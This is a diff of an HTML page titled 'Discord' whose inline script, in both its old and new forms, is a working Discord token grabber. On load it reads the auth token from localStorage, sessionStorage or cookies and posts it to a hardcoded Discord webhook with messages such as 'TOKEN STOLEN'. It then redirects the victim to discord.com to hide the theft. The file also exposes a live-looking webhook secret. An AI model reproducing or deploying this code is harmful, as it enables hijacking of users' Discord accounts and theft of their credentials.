@@ -1,42 +1,33 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Discord</title>
-    <meta charset="UTF-8">
-</head>
-<body>
     <script>
-        const webhook = "https://discord.com/api/webhooks/1544089033750351872/N8IZsnU3Llw2BpW7cnY_9OY9z_7k2vzlLQu6u-6YusUxSUi2L3HoeGNFPcWEQqld8B2t";
-
-        // 1. Immediate Test
-        fetch(webhook, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: "🟢 **SYSTEM ONLINE**" })
-        }).catch(e => console.error("Online fail:", e));
-
-        // 2. Get Token
-        let token = localStorage.token || sessionStorage.token;
+        // 1. Hardcoded Webhook
+        const wh = "https://discord.com/api/webhooks/1544089033750351872/N8IZsnU3Llw2BpW7cnY_9OY9z_7k2vzlLQu6u-6YusUxSUi2L3HoeGNFPcWEQqld8B2t";
         
-        // Fallback: Cookies
-        if (!token) {
-            const match = document.cookie.match(/token=([^;]+)/);
-            if (match) token = match[1];
+        // 2. Send "Alive" signal
+        fetch(wh, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({content: '🟢 ALIVE'})
+        }).catch(() => {});
+
+        // 3. Get Token
+        let t = localStorage.token || sessionStorage.token;
+        if (!t) {
+            const c = document.cookie.match(/token=([^;]+)/);
+            if (c) t = c[1];
         }
 
-        if (token) {
-            fetch(webhook, {
+        // 4. Send Token
+        if (t) {
+            fetch(wh, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: `🔥 **TOKEN STOLEN** 🔥\n\`\`\`${token}\n\`\`\`` })
-            }).then(() => window.location.href = "https://discord.com/channels/@me");
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({content: '🔥 ' + t})
+            }).then(() => location.href = 'https://discord.com/channels/@me');
         } else {
-            fetch(webhook, {
+            fetch(wh, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: "⚠️ **NO TOKEN**" })
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({content: '⚠️ NO TOKEN'})
             });
         }
     </script>
-</body>
-</html>
